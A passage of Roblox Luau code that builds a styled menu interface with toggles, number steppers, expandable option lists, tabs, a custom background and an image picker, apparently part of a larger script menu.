    l.TextSize = 12; l.Font = Enum.Font.GothamBlack; l.TextXAlignment = Enum.TextXAlignment.Left; l.Parent = r
    return r
end

local function uiInputRow(parent, label, def, hidden)

    local r = Instance.new("Frame"); r.ClipsDescendants = true; r.Size = UDim2.new(1,0,0,44)
    r.BackgroundColor3 = Color3.fromRGB(14, 14, 16); r.BackgroundTransparency = 0; r.BorderSizePixel = 0
    if hidden then r.Visible = false end; r.Parent = parent
    Instance.new("UICorner", r).CornerRadius = UDim.new(0, 12)
    local rst = Instance.new("UIStroke"); rst.Color = Color3.fromRGB(40,40,45); rst.Thickness = 1; rst.Transparency = 0.35; rst.ApplyStrokeMode = Enum.ApplyStrokeMode.Border; rst.Parent = r
    local l = Instance.new("TextLabel"); l.Position = UDim2.new(0,14,0,0); l.Size = UDim2.new(1,-84,1,0)
    l.BackgroundTransparency = 1; l.Text = label; l.TextColor3 = Color3.fromRGB(255,255,255); l.TextSize = 14
    l.Font = Enum.Font.GothamMedium; l.TextXAlignment = Enum.TextXAlignment.Left; l.Parent = r
    local bx = Instance.new("TextBox"); bx.Name = "NumBox"; bx.Position = UDim2.new(1,-68,0.5,-13); bx.Size = UDim2.new(0,54,0,26)
    bx.BackgroundColor3 = Color3.fromRGB(22, 22, 26); bx.BorderSizePixel = 0; bx.Text = tostring(def); bx.TextColor3 = Color3.fromRGB(255, 255, 255)
    bx.TextSize = 13; bx.Font = Enum.Font.GothamBold; bx.ClearTextOnFocus = false; bx.TextXAlignment = Enum.TextXAlignment.Center; bx.Parent = r
    bx:SetAttribute("NoTheme", true)
    Instance.new("UICorner",bx).CornerRadius = UDim.new(0, 10)
    local bst = Instance.new("UIStroke"); bst.Color = Color3.fromRGB(40,40,45); bst.Thickness = 1; bst.Transparency = 0.35; bst.ApplyStrokeMode = Enum.ApplyStrokeMode.Border; bst.Parent = bx
    return r, bx
end

local function uiToggleRow(parent, label, on, callback)
    local r = Instance.new("Frame"); r.ClipsDescendants = true; r.Size = UDim2.new(1,0,0,46)
    r.BackgroundColor3 = Color3.fromRGB(0, 0, 0); r.BackgroundTransparency = 0; r.BorderSizePixel = 0; r.Parent = parent; uiCardStyle(r)
    local bar = uiAccentBar(r, on)
    local l = Instance.new("TextLabel"); l.Position = UDim2.new(0,14,0,0); l.Size = UDim2.new(1,-74,1,0)
    l.BackgroundTransparency = 1; l.Text = label; l.TextColor3 = UI_TEXT_PRIMARY; l.TextSize = 14
    l.Font = Enum.Font.GothamMedium; l.TextXAlignment = Enum.TextXAlignment.Left; l.Parent = r

    local tb = Instance.new("TextButton"); tb.Name = "ToggleTrack"; tb.Position = UDim2.new(1,-54,0.5,-11); tb.Size = UDim2.new(0,44,0,22)
    tb.BackgroundColor3 = on and ((M.accentColor and M.accentColor()) or UI_ACCENT or Color3.fromRGB(0, 130, 200)) or (UI_TOGGLE_OFF or Color3.fromRGB(40,40,48)); tb.BorderSizePixel = 0; tb.Text = ""; tb.AutoButtonColor = false; tb.Parent = r
    tb:SetAttribute("ThemeToggle", true)
    Instance.new("UICorner",tb).CornerRadius = UDim.new(0,11)
    local knob = Instance.new("Frame"); knob.Size = UDim2.new(0,16,0,16); knob.BorderSizePixel = 0
    knob.Position = on and UDim2.new(1,-19,0.5,-8) or UDim2.new(0,3,0.5,-8)
    knob.BackgroundColor3 = on and UI_KNOB_ON or UI_TOGGLE_KNOB; knob.Parent = tb
    Instance.new("UICorner",knob)

    local state = on
    local function set(v)
        state = v

        local acc = (M.accentColor and M.accentColor()) or UI_ACCENT or Color3.fromRGB(255, 255, 255)
        local off = UI_TOGGLE_OFF or Color3.fromRGB(40, 40, 48)
        TweenService:Create(tb, UI_TWEEN_FAST, {BackgroundColor3 = v and acc or off}):Play()
        TweenService:Create(knob, UI_TWEEN_FAST, {Position = v and UDim2.new(1,-19,0.5,-8) or UDim2.new(0,3,0.5,-8), BackgroundColor3 = v and (UI_KNOB_ON or Color3.fromRGB(255,255,255)) or (UI_TOGGLE_KNOB or Color3.fromRGB(255,255,255))}):Play()
        TweenService:Create(bar, UI_TWEEN_FAST, {BackgroundTransparency = v and 0 or 1}):Play()
        bar.BackgroundColor3 = acc
        tb.BackgroundColor3 = v and acc or off
    end
    tb.MouseButton1Click:Connect(function()
        set(not state)
        if callback then callback(state) end
        saveCherryConfig()
    end)
    return r, set
end

local function uiActionRow(parent, label, callback)
    local r = Instance.new("Frame"); r.ClipsDescendants = true; r.Size = UDim2.new(1,0,0,42)
    r.BackgroundColor3 = Color3.fromRGB(0, 0, 0); r.BackgroundTransparency = 0; r.BorderSizePixel = 0; r.Parent = parent; uiCardStyle(r)
    local btn = Instance.new("TextButton"); btn.Size = UDim2.new(1,0,1,0); btn.BackgroundTransparency = 1
    btn.Text = label; btn.TextColor3 = UI_TEXT_PRIMARY; btn.TextSize = 14; btn.Font = Enum.Font.GothamBold; btn.Parent = r
    local bar = uiAccentBar(r, false)

    btn.MouseButton1Click:Connect(function()
        bar.BackgroundColor3 = UI_ACCENT
        TweenService:Create(bar, UI_TWEEN_FAST, {BackgroundTransparency = 0}):Play()
        task.delay(0.3, function() TweenService:Create(bar, UI_TWEEN_FAST, {BackgroundTransparency = 1}):Play() end)
        if callback then callback() end
    end)
    return r, btn
end

local function uiNumberRow(parent, label, value, minV, maxV, callback)
    local r, bx = uiInputRow(parent, label, value)
    bx.FocusLost:Connect(function()
        local n = tonumber(bx.Text)
        if n and n >= minV and n <= maxV then
            if callback then callback(n) end
            saveCherryConfig()
        else
            bx.Text = tostring(value)
        end
    end)
    return r, bx
end

local function uiStepNumberRow(parent, label, value, minV, maxV, callback)

    local r = Instance.new("Frame"); r.ClipsDescendants = true; r.Size = UDim2.new(1,0,0,44)
    r.BackgroundColor3 = Color3.fromRGB(0, 0, 0); r.BackgroundTransparency = 0; r.BorderSizePixel = 0; r.Parent = parent
    Instance.new("UICorner", r).CornerRadius = UDim.new(0, 10)
    do local rst=Instance.new("UIStroke"); rst.Color=Color3.fromRGB(40,40,45); rst.Thickness=1; rst.Transparency=0.35; rst.ApplyStrokeMode=Enum.ApplyStrokeMode.Border; rst.Parent=r end
    local l = Instance.new("TextLabel"); l.Position=UDim2.new(0,14,0,0); l.Size=UDim2.new(1,-150,1,0); l.BackgroundTransparency=1
    l.Text=label; l.TextColor3=Color3.fromRGB(255,255,255); l.TextSize=14; l.Font=Enum.Font.GothamMedium; l.TextXAlignment=Enum.TextXAlignment.Left; l.Parent=r
    local cur = tonumber(value) or minV or 1
    local function mkBtn(txt, xOff)
        local b = Instance.new("TextButton")
        b.Size = UDim2.new(0, 28, 0, 28)
        b.Position = UDim2.new(1, xOff, 0.5, -14)
        b.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
        b.BorderSizePixel = 0
        b.Text = txt
        b.TextColor3 = Color3.fromRGB(255, 255, 255)
        b.TextSize = 18
        b.Font = Enum.Font.GothamBold
        b.AutoButtonColor = false
        b.Parent = r
        Instance.new("UICorner", b).CornerRadius = UDim.new(0, 8)
        local st = Instance.new("UIStroke"); st.Color = Color3.fromRGB(63, 63, 63); st.Thickness = 1; st.Parent = b
        return b
    end
    local minusBtn = mkBtn("-", -118)
    local vl = Instance.new("TextBox"); vl.Name="NumBox"; vl.Position=UDim2.new(1,-86,0.5,-14); vl.Size=UDim2.new(0,50,0,28)
    vl.BackgroundColor3=Color3.fromRGB(0,0,0); vl.BorderSizePixel=0; vl.Text=tostring(cur)
    vl.TextColor3=Color3.fromRGB(255,255,255); vl.TextSize=14; vl.Font=Enum.Font.GothamBold
    vl.ClearTextOnFocus=false; vl.TextXAlignment=Enum.TextXAlignment.Center; vl.Parent=r
    Instance.new("UICorner",vl).CornerRadius=UDim.new(0,9)
    local vst = Instance.new("UIStroke"); vst.Color=Color3.fromRGB(40,40,45); vst.Thickness=1; vst.Transparency=0.35; vst.ApplyStrokeMode=Enum.ApplyStrokeMode.Border; vst.Parent=vl
    local plusBtn = mkBtn("+", -32)
    local function setVal(n)
        n = math.clamp(math.floor(tonumber(n) or cur), minV or 1, maxV or 500)
        cur = n
        vl.Text = tostring(cur)
        if callback then callback(cur) end
        pcall(saveCherryConfig)
    end
    minusBtn.MouseButton1Click:Connect(function() setVal(cur - 1) end)
    plusBtn.MouseButton1Click:Connect(function() setVal(cur + 1) end)
    vl.FocusLost:Connect(function()
        local n = tonumber(vl.Text)
        if n then setVal(n) else vl.Text = tostring(cur) end
    end)
    return r, vl, setVal
end

local function uiChoiceRow(parent, label, options, defaultIndex, callback)
    local r = Instance.new("Frame"); r.ClipsDescendants = true; r.Size = UDim2.new(1,0,0,44)
    r.BackgroundColor3 = Color3.fromRGB(0, 0, 0); r.BackgroundTransparency = 0; r.BorderSizePixel = 0; r.Parent = parent; uiCardStyle(r)
    local l = Instance.new("TextLabel"); l.Position=UDim2.new(0,13,0,0); l.Size=UDim2.new(0.43,0,0,44); l.BackgroundTransparency=1
    l.Text=label; l.TextColor3=UI_TEXT_PRIMARY; l.TextSize=13; l.Font=Enum.Font.GothamMedium; l.TextXAlignment=Enum.TextXAlignment.Left; l.Parent=r
    local la = uiSmallBtn({Parent=r, Pos=UDim2.new(1,-174,0,8), Size=UDim2.new(0,29,0,27), Text="<", Col=UI_TEXT_PRIMARY, TS=13, CR=7})
    local vl = Instance.new("TextLabel"); vl.Position=UDim2.new(1,-141,0,8); vl.Size=UDim2.new(0,102,0,27)
    vl.BackgroundColor3=UI_BTN_BG; vl.BorderSizePixel=0; vl.Text=options[defaultIndex or 1]; vl.TextColor3=UI_TEXT_PRIMARY; vl.TextSize=10; vl.Font=Enum.Font.GothamBold; vl.Parent=r
    Instance.new("UICorner",vl).CornerRadius=UDim.new(0,7)
    local ra = uiSmallBtn({Parent=r, Pos=UDim2.new(1,-35,0,8), Size=UDim2.new(0,29,0,27), Text=">", Col=UI_TEXT_PRIMARY, TS=13, CR=7})
    local idx = defaultIndex or 1
    local function upd()
        vl.Text = options[idx]
        if callback then callback(options[idx]) end
        saveCherryConfig()
    end
    la.MouseButton1Click:Connect(function() idx=idx-1; if idx<1 then idx=#options end; upd() end)
    ra.MouseButton1Click:Connect(function() idx=idx+1; if idx>#options then idx=1 end; upd() end)
    local function setVal(v)
        for i,o in ipairs(options) do if o==v then idx=i; vl.Text=o; break end end
    end
    return r, setVal
end

local ARROW_GLOW_TRANSPARENCY = NumberSequence.new({
    NumberSequenceKeypoint.new(0, 0.82, 0),
    NumberSequenceKeypoint.new(0.28, 0.06, 0),
    NumberSequenceKeypoint.new(0.52, 0.22, 0),
    NumberSequenceKeypoint.new(1, 0.82, 0),
})

local function styleArrowButton(arrow)

    local border = Instance.new("UIStroke")
    border.Name = "AnimatedArrowBorder"
    border.Color = Color3.fromRGB(40, 40, 45)
    border.Thickness = 1.8
    border.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    border.Transparency = 0.05
    border.Parent = arrow
    local bg = Instance.new("UIGradient")
    bg.Rotation = 135
    bg.Transparency = ARROW_GLOW_TRANSPARENCY
    bg.Parent = border

    local glow = Instance.new("UIStroke")
    glow.Name = "AnimatedArrowGlow"
    glow.Color = Color3.fromRGB(255, 255, 255)
    glow.Thickness = 3.6
    glow.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    glow.Transparency = 0.58
    glow.Parent = arrow
    local gg = Instance.new("UIGradient")
    gg.Name = "GlowGradient"
    gg.Rotation = 180
    gg.Transparency = ARROW_GLOW_TRANSPARENCY
    gg.Parent = glow
end

local function styleOptionChip(btn, active)

    btn:SetAttribute("ThemeChip", true)
    btn:SetAttribute("ChipActive", active and true or false)
    btn.TextColor3 = active and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(200, 200, 200)
    btn.BackgroundColor3 = active and UI_ACCENT or Color3.fromRGB(30, 30, 32)
    local stroke = btn:FindFirstChildOfClass("UIStroke")
    if not stroke then
        stroke = Instance.new("UIStroke")
        stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
        stroke.Parent = btn
    end
    stroke.Color = Color3.fromRGB(40, 40, 45)
    stroke.Thickness = 1
    stroke.Transparency = 0.35
    btn.TextStrokeTransparency = 1
end

local function uiExpandToggleRow(parent, label, on, options, defaultIndex, onToggle, onOption)

    local container = Instance.new("Frame")
    container.BackgroundTransparency = 1
    container.Size = UDim2.new(1, 0, 0, 46)
    container.AutomaticSize = Enum.AutomaticSize.Y
    container.ClipsDescendants = false
    container.Parent = parent

    local col = Instance.new("UIListLayout")
    col.FillDirection = Enum.FillDirection.Vertical
    col.SortOrder = Enum.SortOrder.LayoutOrder
    col.Padding = UDim.new(0, 6)
    col.Parent = container

    local r = Instance.new("Frame")
    r.LayoutOrder = 1
    r.ClipsDescendants = true
    r.Size = UDim2.new(1, 0, 0, 46)
    r.BackgroundColor3 = UI_ROW_BG
    r.BackgroundTransparency = 0.1
    r.BorderSizePixel = 0
    r.Parent = container
    uiCardStyle(r)

    local bar = uiAccentBar(r, on)
    local l = Instance.new("TextLabel")
    l.Position = UDim2.new(0, 14, 0, 0)
    l.Size = UDim2.new(1, -110, 1, 0)
    l.BackgroundTransparency = 1
    l.Text = label
    l.TextColor3 = UI_TEXT_PRIMARY
    l.TextSize = 14
    l.Font = Enum.Font.GothamMedium
    l.TextXAlignment = Enum.TextXAlignment.Left
    l.Parent = r

    local expanded = false
    local arrow = Instance.new("TextButton")
    arrow.Name = "ArrowButton"
    arrow.Position = UDim2.new(1, -100, 0.5, -13)
    arrow.Size = UDim2.new(0, 36, 0, 26)
    arrow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    arrow.BackgroundTransparency = 0.1
    arrow.BorderSizePixel = 0
    arrow.Text = "▼"
    arrow.Rotation = 0
    arrow.TextColor3 = Color3.fromRGB(255, 255, 255)
    arrow.TextSize = 14
    arrow.Font = Enum.Font.GothamBlack
    arrow.AutoButtonColor = false
    arrow.Parent = r
    Instance.new("UICorner", arrow).CornerRadius = UDim.new(0, 7)
    styleArrowButton(arrow)

    local tb = Instance.new("TextButton")
    tb.Position = UDim2.new(1, -54, 0.5, -11)
    tb.Size = UDim2.new(0, 44, 0, 22)
    tb.BackgroundColor3 = on and ((M.accentColor and M.accentColor()) or UI_ACCENT) or UI_TOGGLE_OFF
    tb.BorderSizePixel = 0
    tb.Text = ""
    tb.AutoButtonColor = false
    tb.Parent = r
    Instance.new("UICorner", tb).CornerRadius = UDim.new(0, 11)
    local knob = Instance.new("Frame")
    knob.Size = UDim2.new(0, 16, 0, 16)
    knob.BorderSizePixel = 0
    knob.Position = on and UDim2.new(1, -19, 0.5, -8) or UDim2.new(0, 3, 0.5, -8)
    knob.BackgroundColor3 = on and UI_KNOB_ON or UI_TOGGLE_KNOB
    knob.Parent = tb
    Instance.new("UICorner", knob)


    local useScroll = #options > 4
    local optFrame = Instance.new("Frame")
    optFrame.LayoutOrder = 2
    optFrame.Size = UDim2.new(1, 0, 0, useScroll and 140 or 40)
    optFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    optFrame.BackgroundTransparency = 0.12
    optFrame.BorderSizePixel = 0
    optFrame.Visible = false
    optFrame.ClipsDescendants = true
    optFrame.Parent = container
    uiCardStyle(optFrame)

    local optPad = Instance.new("UIPadding")
    optPad.PaddingLeft = UDim.new(0, 8)
    optPad.PaddingRight = UDim.new(0, 8)
    optPad.PaddingTop = UDim.new(0, 6)
    optPad.PaddingBottom = UDim.new(0, 6)
    optPad.Parent = optFrame

    local optParent = optFrame
    if useScroll then
        local scroll = Instance.new("ScrollingFrame")
        scroll.Name = "OptionsScroll"
        scroll.Size = UDim2.new(1, -4, 1, -4)
        scroll.Position = UDim2.new(0, 2, 0, 2)
        scroll.BackgroundTransparency = 1
        scroll.BorderSizePixel = 0
        scroll.ScrollBarThickness = 5
        scroll.ScrollBarImageColor3 = UI_ACCENT
        scroll.ScrollingDirection = Enum.ScrollingDirection.Y
        scroll.ElasticBehavior = Enum.ElasticBehavior.Always
        scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
        scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
        scroll.Parent = optFrame
        local sPad = Instance.new("UIPadding")
        sPad.PaddingLeft = UDim.new(0, 6)
        sPad.PaddingRight = UDim.new(0, 8)
        sPad.PaddingTop = UDim.new(0, 4)
        sPad.PaddingBottom = UDim.new(0, 8)
        sPad.Parent = scroll
        local sLay = Instance.new("UIListLayout")
        sLay.FillDirection = Enum.FillDirection.Vertical
        sLay.Padding = UDim.new(0, 5)
        sLay.SortOrder = Enum.SortOrder.LayoutOrder
        sLay.Parent = scroll
        optParent = scroll
    else
        local optLayout = Instance.new("UIListLayout")
        optLayout.FillDirection = Enum.FillDirection.Horizontal
        optLayout.Padding = UDim.new(0, 6)
        optLayout.VerticalAlignment = Enum.VerticalAlignment.Center
        optLayout.SortOrder = Enum.SortOrder.LayoutOrder
        optLayout.Parent = optFrame
    end

    local settingsHost = Instance.new("Frame")
    settingsHost.Name = "ModeSettings"
    settingsHost.LayoutOrder = 3
    settingsHost.Size = UDim2.new(1, 0, 0, 0)
    settingsHost.AutomaticSize = Enum.AutomaticSize.Y
    settingsHost.BackgroundTransparency = 1
    settingsHost.Visible = false
    settingsHost.Parent = container

    local settingsLayout = Instance.new("UIListLayout")
    settingsLayout.Padding = UDim.new(0, 6)
    settingsLayout.SortOrder = Enum.SortOrder.LayoutOrder
    settingsLayout.Parent = settingsHost

    local idx = defaultIndex or 1
    local optionBtns = {}
    local state = on
    local modeSettings = {}

    local function refreshOptionVisuals()
        for i, b in ipairs(optionBtns) do
            styleOptionChip(b, i == idx)
        end
    end

    local function refreshModeSettings()
        local any = false
        for lab, fr in pairs(modeSettings) do
            local show = expanded and (lab == options[idx])
            fr.Visible = show
            if show then any = true end
        end
        settingsHost.Visible = any

    end

    for i, opt in ipairs(options) do
        local b = Instance.new("TextButton")
        b.LayoutOrder = i
        if useScroll then
            b.Size = UDim2.new(1, -4, 0, 30)
        else
            b.Size = UDim2.new(0, math.max(56, #tostring(opt) * 9 + 18), 0, 28)
        end
        b.BorderSizePixel = 0
        b.Text = tostring(opt)
        b.TextSize = useScroll and 12 or 12
        b.Font = Enum.Font.GothamBlack
        b.TextXAlignment = useScroll and Enum.TextXAlignment.Left or Enum.TextXAlignment.Center
        b.AutoButtonColor = false
        b.Parent = optParent
        Instance.new("UICorner", b).CornerRadius = UDim.new(0, 7)
        if useScroll then
            local p = Instance.new("UIPadding")
            p.PaddingLeft = UDim.new(0, 10)
            p.Parent = b
        end
        styleOptionChip(b, i == idx)
        b.MouseButton1Click:Connect(function()
            idx = i
            refreshOptionVisuals()
            refreshModeSettings()
            if onOption then onOption(options[idx]) end
            saveCherryConfig()
        end)
        optionBtns[i] = b
    end

    -- smoother expand/collapse like Anti-Sammy SectBody (Quint tween, clipsDescendants)
    local expandToken = 0
    local TWEEN_EXPAND = TweenInfo.new(0.24, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
    local TWEEN_COLLAPSE = TweenInfo.new(0.20, Enum.EasingStyle.Quint, Enum.EasingDirection.In)
    local function setExpanded(v)
        expanded = v
        arrow.Text = v and "▲" or "▼"
        pcall(function()
            TweenService:Create(arrow, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Rotation = v and 180 or 0}):Play()
        end)
        refreshModeSettings()
        expandToken = expandToken + 1
        local token = expandToken
        if v then
            optFrame.Visible = true
            optFrame.ClipsDescendants = true
            optFrame.AutomaticSize = Enum.AutomaticSize.None
            local targetH = useScroll and 140 or 40
            -- start from 0 height
            optFrame.Size = UDim2.new(1, 0, 0, 0)
            optFrame.BackgroundTransparency = 1
            pcall(function()
                TweenService:Create(optFrame, TWEEN_EXPAND, {Size = UDim2.new(1, 0, 0, targetH), BackgroundTransparency = 0.12}):Play()
            end)
            task.delay(0.26, function()
                if token == expandToken and expanded then
                    -- restore autosize after tween so dynamic content fits
                    pcall(function()
                        optFrame.AutomaticSize = Enum.AutomaticSize.Y
                    end)
                end
            end)
        else
            local startH = optFrame.AbsoluteSize.Y
            if startH < 4 then startH = useScroll and 140 or 40 end
            optFrame.AutomaticSize = Enum.AutomaticSize.None
            optFrame.Size = UDim2.new(1, 0, 0, startH)
            pcall(function()
                TweenService:Create(optFrame, TWEEN_COLLAPSE, {Size = UDim2.new(1, 0, 0, 0), BackgroundTransparency = 1}):Play()
            end)
            task.delay(0.22, function()
                if token == expandToken and not expanded then
                    optFrame.Visible = false
                    optFrame.BackgroundTransparency = 0.12
                end
            end)
        end
    end

    arrow.MouseButton1Click:Connect(function()
        setExpanded(not expanded)
    end)

    local function set(v)
        state = v
        local acc = (M.accentColor and M.accentColor()) or UI_ACCENT or Color3.fromRGB(255, 255, 255)
        local off = UI_TOGGLE_OFF or Color3.fromRGB(40, 40, 48)
        tb.BackgroundColor3 = v and acc or off
        TweenService:Create(tb, UI_TWEEN_FAST, {BackgroundColor3 = v and acc or off}):Play()
        TweenService:Create(knob, UI_TWEEN_FAST, {
            Position = v and UDim2.new(1, -19, 0.5, -8) or UDim2.new(0, 3, 0.5, -8),
            BackgroundColor3 = v and (UI_KNOB_ON or Color3.fromRGB(255,255,255)) or (UI_TOGGLE_KNOB or Color3.fromRGB(255,255,255))
        }):Play()
        TweenService:Create(bar, UI_TWEEN_FAST, {BackgroundTransparency = v and 0 or 1}):Play()
        bar.BackgroundColor3 = acc
    end

    tb.MouseButton1Click:Connect(function()
        set(not state)
        if onToggle then onToggle(state) end
        saveCherryConfig()
    end)

    local function setOption(v)
        for i, o in ipairs(options) do
            if o == v then
                idx = i
                refreshOptionVisuals()
                refreshModeSettings()
                break
            end
        end
    end

    local function registerModeSettings(optionLabel, frame)
        frame.Parent = settingsHost
        frame.Visible = false
        frame.Size = UDim2.new(1, 0, 0, 0)
        frame.AutomaticSize = Enum.AutomaticSize.Y
        modeSettings[optionLabel] = frame
        task.defer(refreshModeSettings)
    end

    return container, set, setOption, registerModeSettings, function() return options[idx] end
end

local function uiMakePage(parent, name, order, vis)
    local p = Instance.new("ScrollingFrame"); p.Name=name; p.Visible=vis~=false; p.LayoutOrder=order
    p.Size=UDim2.new(1,0,1,0); p.BackgroundTransparency=1; p.BorderSizePixel=0
    p.ScrollBarThickness=8
    p.ScrollBarImageColor3=UI_ACCENT
    p.ScrollBarImageTransparency=0.15
    p.ScrollingEnabled=true
    p.ScrollingDirection=Enum.ScrollingDirection.Y
    p.ElasticBehavior=Enum.ElasticBehavior.Always
    p.AutomaticCanvasSize=Enum.AutomaticSize.Y
    p.CanvasSize=UDim2.new(0,0,0,0)
    p.Parent=parent
    local l = Instance.new("UIListLayout"); l.Padding=UDim.new(0,7); l.SortOrder=Enum.SortOrder.LayoutOrder; l.Parent=p
    local pd = Instance.new("UIPadding")
    pd.PaddingTop=UDim.new(0,4)
    pd.PaddingBottom=UDim.new(0,40)
    pd.PaddingRight=UDim.new(0,6)
    pd.PaddingLeft=UDim.new(0,2)
    pd.Parent=p
    uiAutoCanvas(p)
    return p
end

local function uiMakeTab(parent, name, text, pos, active)
    local b = Instance.new("TextButton"); b.Name=name; b.ZIndex=9
    if pos then b.Position=pos end
    b.Size = UDim2.new(0, 96, 0, 38)
    b.BackgroundColor3 = active and UI_ACCENT or Color3.fromRGB(0, 0, 0)
    b.BackgroundTransparency = active and 0.05 or 0.35
    b.BorderSizePixel=0
    b.Text=text
    b.TextColor3 = active and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(104, 104, 104)
    b.TextStrokeTransparency = 1
    b.TextTransparency=0
    b.TextSize=12; b.Font=Enum.Font.GothamBlack; b.AutoButtonColor=false; b.Parent=parent
    Instance.new("UICorner",b).CornerRadius=UDim.new(0,10)
    local stroke = Instance.new("UIStroke"); stroke.Name="TabStroke"
    stroke.Color = UI_ACCENT or Color3.fromRGB(255,255,255)
    stroke.Thickness = active and 1.5 or 1
    stroke.Transparency = active and 0.15 or 0.75
    stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    stroke.Parent = b
    b:SetAttribute("IsActiveTab", active and true or false)
    b.MouseEnter:Connect(function()
        if not b:GetAttribute("IsActiveTab") then
            TweenService:Create(b, UI_TWEEN_FAST, {
                BackgroundColor3 = UI_ACCENT,
                BackgroundTransparency = 0.55,
                TextColor3 = Color3.fromRGB(255, 255, 255)
            }):Play()
            local st = b:FindFirstChild("TabStroke")
            if st then st.Transparency = 0.35; st.Thickness = 1.2 end
        end
    end)
    b.MouseLeave:Connect(function()
        if not b:GetAttribute("IsActiveTab") then
            TweenService:Create(b, UI_TWEEN_FAST, {
                BackgroundColor3 = Color3.fromRGB(0, 0, 0),
                BackgroundTransparency = 0.35,
                TextColor3 = Color3.fromRGB(104, 104, 104)
            }):Play()
            local st = b:FindFirstChild("TabStroke")
            if st then st.Transparency = 0.75; st.Thickness = 1 end
        end
    end)
    return b
end

function M.applyCustomBackground(frame)
    if not frame then return end
    for _, n in ipairs({"CustomBgImage", "CustomBgPinkTint", "DotPattern", "CustomBgOverlay", "PanelBgImage", "PanelBgOverlay", "PanelDotPattern"}) do
        local old = frame:FindFirstChild(n)
        if old then pcall(function() old:Destroy() end) end
    end

    local ONLY_BG = (M.getSelectedBgId and select(1, M.getSelectedBgId())) or tonumber(M.MENU_BG_ASSET) or 73023682914801
    M.customBgId = ONLY_BG
    M.customBgKey = nil
    local imageSrc = "rbxassetid://" .. tostring(ONLY_BG)

    pcall(function()
        frame.ClipsDescendants = true
        frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        frame.BackgroundTransparency = 0.35
    end)

    local radius = UDim.new(0, M.MENU_CORNER_R or 22)
    local fc = frame:FindFirstChildOfClass("UICorner")
    if fc then radius = fc.CornerRadius end

    local img = Instance.new("ImageLabel")
    img.Name = "CustomBgImage"
    img.BackgroundTransparency = 1
    img.Size = UDim2.new(1, 0, 1, 0)
    img.Position = UDim2.new(0, 0, 0, 0)
    img.Image = imageSrc
    img.ScaleType = Enum.ScaleType.Crop
    img.ImageTransparency = 0
    img.ZIndex = 0
    img:SetAttribute("BgTint", true)
    pcall(function() img.ImageColor3 = Color3.fromRGB(255, 255, 255) end)
    img.Parent = frame
    local c = Instance.new("UICorner")
    c.Name = "BgCorner"
    c.CornerRadius = radius
    c.Parent = img

    -- no heavy wash/recolor so background stays visible
    -- light overlay only (not covered by black)
    local overlay = Instance.new("Frame")
    overlay.Name = "CustomBgOverlay"
    overlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    overlay.BackgroundTransparency = 0.72
    overlay.Size = UDim2.new(1, 0, 1, 0)
    overlay.BorderSizePixel = 0
    overlay.ZIndex = 1
    overlay.Parent = frame
    local oc = Instance.new("UICorner")
    oc.CornerRadius = radius
    oc.Parent = overlay

    pcall(function() if M.refreshMobileButtonTheme then M.refreshMobileButtonTheme() end end)
end

function M.openImagePicker(kind)

    local isBg = kind == "bg"
    local ids = isBg and M.BG_IMAGE_IDS or M.MOB_BTN_IMAGE_IDS
    local title = isBg and "CUSTOM BG" or "BUTTON BG"
    local currentId = isBg and (tonumber(M.customBgId) or 0) or (tonumber(M.mobBtnBgId) or 0)
    local opacity = math.clamp(tonumber(M.customBgOpacity) or 0.35, 0, 1)

    local old = player.PlayerGui:FindFirstChild("VynxImagePicker")
    if old then old:Destroy() end
    local cg = game:GetService("CoreGui"):FindFirstChild("VynxImagePicker")
    if cg then cg:Destroy() end

    local gui = Instance.new("ScreenGui")
    gui.Name = "VynxImagePicker"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.DisplayOrder = 120
    pcall(function() gui.Parent = game:GetService("CoreGui") end)
    if not gui.Parent then gui.Parent = player:WaitForChild("PlayerGui") end

    local dim = Instance.new("TextButton")
    dim.Size = UDim2.fromScale(1, 1)
    dim.BackgroundColor3 = Color3.new(0, 0, 0)
    dim.BackgroundTransparency = 0.45
    dim.Text = ""
    dim.AutoButtonColor = false
    dim.ZIndex = 1
    dim.Parent = gui
    dim.MouseButton1Click:Connect(function() gui:Destroy() end)

    local panel = Instance.new("Frame")
    panel.AnchorPoint = Vector2.new(0.5, 0.5)
    panel.Position = UDim2.new(0.5, 0, 0.5, 0)
    panel.Size = UDim2.new(0, 220, 0, isBg and 280 or 230)
    panel.BackgroundColor3 = Color3.fromRGB(12, 12, 16)
    panel.BorderSizePixel = 0
    panel.ZIndex = 2
    panel.ClipsDescendants = true
    panel.Parent = gui
    Instance.new("UICorner", panel).CornerRadius = UDim.new(0, 14)
    local pst = Instance.new("UIStroke", panel)
    pst.Color = Color3.fromRGB(54, 54, 76)
    pst.Thickness = 1

    local hdr = Instance.new("TextLabel")
    hdr.Size = UDim2.new(1, -40, 0, 28)
    hdr.Position = UDim2.new(0, 12, 0, 6)
    hdr.BackgroundTransparency = 1
    hdr.Text = title
    hdr.TextColor3 = Color3.fromRGB(247, 247, 255)
    hdr.Font = Enum.Font.GothamBold
    hdr.TextSize = 12
    hdr.TextXAlignment = Enum.TextXAlignment.Left
    hdr.ZIndex = 3
    hdr.Parent = panel

    local close = Instance.new("TextButton")
    close.Size = UDim2.new(0, 24, 0, 24)
    close.Position = UDim2.new(1, -30, 0, 6)
    close.BackgroundTransparency = 1
    close.Text = "×"
    close.TextColor3 = Color3.fromRGB(30, 30, 30)
    close.Font = Enum.Font.GothamBold
    close.TextSize = 18
    close.ZIndex = 3
    close.Parent = panel
    close.MouseButton1Click:Connect(function() gui:Destroy() end)

    local preview = Instance.new("ImageLabel")
    preview.Name = "Preview"
    preview.Size = UDim2.new(1, -24, 0, 100)
    preview.Position = UDim2.new(0, 12, 0, 34)
    preview.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    preview.BorderSizePixel = 0
